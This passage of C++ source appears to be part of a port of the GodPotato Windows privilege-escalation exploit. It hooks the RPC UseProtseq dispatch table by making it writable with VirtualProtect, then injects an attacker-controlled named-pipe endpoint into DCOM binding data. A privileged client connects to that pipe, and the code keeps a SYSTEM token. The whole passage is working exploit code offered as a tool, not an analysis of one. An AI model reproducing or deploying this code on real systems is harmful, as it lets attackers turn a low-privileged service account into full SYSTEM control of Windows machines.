    VirtualProtect(reinterpret_cast<void*>(dispatchTablePtr),
                   static_cast<SIZE_T>(sizeof(uintptr_t) * dispatchTable.size()),
                   PAGE_EXECUTE_READWRITE,
                   &oldProtect);

    uintptr_t hookPtr = 0;
    switch (useProtseqFunctionParamCount)
    {
    case 4:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction4);
        break;
    case 5:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction5);
        break;
    case 6:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction6);
        break;
    case 7:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction7);
        break;
    case 8:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction8);
        break;
    case 9:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction9);
        break;
    case 10:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction10);
        break;
    case 11:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction11);
        break;
    case 12:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction12);
        break;
    case 13:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction13);
        break;
    case 14:
        hookPtr = reinterpret_cast<uintptr_t>(&customUseProtseqFunction14);
        break;
    default:
        throw std::runtime_error("UseProtseqFunctionParamCount unsupported");
    }

    {
        LOG_INFO_STREAM << "[*] Hooking UseProtseq with param count: " << useProtseqFunctionParamCount << std::endl;
    }

    // Replace the first entry in the dispatch table.
    *reinterpret_cast<uintptr_t*>(dispatchTablePtr) = hookPtr;

    isHook = true;
}

void GodPotatoContext::restore()
{
    if (isHook && useProtseqFunctionPtr != 0)
    {
        DWORD oldProtect = 0;
        VirtualProtect(reinterpret_cast<void*>(dispatchTablePtr),
                       static_cast<SIZE_T>(sizeof(uintptr_t) * dispatchTable.size()),
                       PAGE_EXECUTE_READWRITE,
                       &oldProtect);

        *reinterpret_cast<uintptr_t*>(dispatchTablePtr) = useProtseqFunctionPtr;
        isHook = false;
    }
}

void GodPotatoContext::stop()
{
    if (isStart)
    {
        isStart = false;
        if (pipeServerThread.joinable())
        {
            try
            {
                // Try to connect to the pipe to break the thread
                SECURITY_ATTRIBUTES sa = {};
                sa.nLength = sizeof(SECURITY_ATTRIBUTES);
                sa.bInheritHandle = FALSE;
                
                HANDLE pipeClientHandle = CreateFileA(
                    serverPipe.c_str(),
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    &sa,
                    OPEN_EXISTING,
                    0,
                    nullptr
                );
                
                if (pipeClientHandle != INVALID_HANDLE_VALUE)
                {
                    DWORD bytesWritten;
                    BYTE dummyData = 0xaa;
                    WriteFile(pipeClientHandle, &dummyData, 1, &bytesWritten, nullptr);
                    FlushFileBuffers(pipeClientHandle);
                    CloseHandle(pipeClientHandle);
                }
            }
            catch (...)
            {
                // If anything goes wrong, interrupt the thread
                pipeServerThread.detach(); // Detach rather than join to avoid blocking
            }
            
            // Wait a bit for the thread to finish gracefully
            Sleep(100);
            
            if (pipeServerThread.joinable())
            {
                pipeServerThread.join();
            }
        }
    }
    else
    {
        throw std::runtime_error("IsStart == false");
    }
}

HANDLE GodPotatoContext::getToken() const
{
    return systemToken;
}

bool GodPotatoContext::isStarted() const
{
    return isStart;
}

// isVerbose removed

const char* GodPotatoContext::getClientPipe() const
{
    return clientPipe.c_str();
}

// 定义静态成员变量
GodPotatoContext* GodPotatoContext::currentInstance = nullptr;

void GodPotatoContext::setCurrentInstance(GodPotatoContext* instance)
{
    currentInstance = instance;
}

int WINAPI GodPotatoContext::customUseProtseqFunction4(void* p0, void* p1, void* p2, void* p3)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun4(p0, p1, p2, p3);
}

int WINAPI GodPotatoContext::customUseProtseqFunction5(void* p0, void* p1, void* p2, void* p3, void* p4)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun5(p0, p1, p2, p3, p4);
}

int WINAPI GodPotatoContext::customUseProtseqFunction6(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun6(p0, p1, p2, p3, p4, p5);
}

int WINAPI GodPotatoContext::customUseProtseqFunction7(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun7(p0, p1, p2, p3, p4, p5, p6);
}

int WINAPI GodPotatoContext::customUseProtseqFunction8(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun8(p0, p1, p2, p3, p4, p5, p6, p7);
}

int WINAPI GodPotatoContext::customUseProtseqFunction9(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun9(p0, p1, p2, p3, p4, p5, p6, p7, p8);
}

int WINAPI GodPotatoContext::customUseProtseqFunction10(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun10(p0, p1, p2, p3, p4, p5, p6, p7, p8, p9);
}

int WINAPI GodPotatoContext::customUseProtseqFunction11(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun11(p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10);
}

int WINAPI GodPotatoContext::customUseProtseqFunction12(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun12(p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11);
}

int WINAPI GodPotatoContext::customUseProtseqFunction13(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun13(p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12);
}

int WINAPI GodPotatoContext::customUseProtseqFunction14(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12, void* p13)
{
    if (currentInstance == nullptr)
    {
        return 0;
    }
    NewOrcbRPC rpc(currentInstance);
    return rpc.fun14(p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13);
}

// ===== NewOrcbRPC methods =====
NewOrcbRPC::NewOrcbRPC(GodPotatoContext* context)
    : godPotatoContext(context)
{
}

int NewOrcbRPC::fun(void* ppdsaNewBindings, void* /*ppdsaNewSecurity*/)
{
    std::wstring clientPipeWide = ToWide(godPotatoContext->getClientPipe());
    std::vector<std::wstring> endpoints = { clientPipeWide, L"ncacn_ip_tcp:test!" };

    int entrySize = 3;
    for (const auto& endpoint : endpoints)
    {
        entrySize += static_cast<int>(endpoint.size());
        entrySize += 1;
    }

    int memorySize = entrySize * 2 + 10;
    uint8_t* buffer = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, static_cast<SIZE_T>(memorySize)));
    if (!buffer)
    {
        return 0;
    }

    int offset = 0;
    *reinterpret_cast<int16_t*>(buffer + offset) = static_cast<int16_t>(entrySize);
    offset += 2;
    *reinterpret_cast<int16_t*>(buffer + offset) = static_cast<int16_t>(entrySize - 2);
    offset += 2;

    for (const auto& endpoint : endpoints)
    {
        for (wchar_t ch : endpoint)
        {
            *reinterpret_cast<int16_t*>(buffer + offset) = static_cast<int16_t>(ch);
            offset += 2;
        }
        offset += 2;
    }

    *reinterpret_cast<void**>(ppdsaNewBindings) = buffer;
    return 0;
}

int NewOrcbRPC::fun4(void* /*p0*/, void* /*p1*/, void* p2, void* p3)
{
    return fun(p2, p3);
}

int NewOrcbRPC::fun5(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* p3, void* p4)
{
    return fun(p3, p4);
}

int NewOrcbRPC::fun6(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* p4, void* p5)
{
    return fun(p4, p5);
}

int NewOrcbRPC::fun7(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* p5, void* p6)
{
    return fun(p5, p6);
}

int NewOrcbRPC::fun8(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* p6, void* p7)
{
    return fun(p6, p7);
}

int NewOrcbRPC::fun9(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* /*p6*/, void* p7, void* p8)
{
    return fun(p7, p8);
}

int NewOrcbRPC::fun10(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* /*p6*/, void* /*p7*/, void* p8, void* p9)
{
    return fun(p8, p9);
}

int NewOrcbRPC::fun11(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* /*p6*/, void* /*p7*/, void* /*p8*/, void* p9, void* p10)
{
    return fun(p9, p10);
}

int NewOrcbRPC::fun12(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* /*p6*/, void* /*p7*/, void* /*p8*/, void* /*p9*/, void* p10, void* p11)
{
    return fun(p10, p11);
}

int NewOrcbRPC::fun13(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* /*p6*/, void* /*p7*/, void* /*p8*/, void* /*p9*/, void* /*p10*/, void* p11, void* p12)
{
    return fun(p11, p12);
}

int NewOrcbRPC::fun14(void* /*p0*/, void* /*p1*/, void* /*p2*/, void* /*p3*/, void* /*p4*/, void* /*p5*/, void* /*p6*/, void* /*p7*/, void* /*p8*/, void* /*p9*/, void* /*p10*/, void* /*p11*/, void* p12, void* p13)
{
    return fun(p12, p13);
}





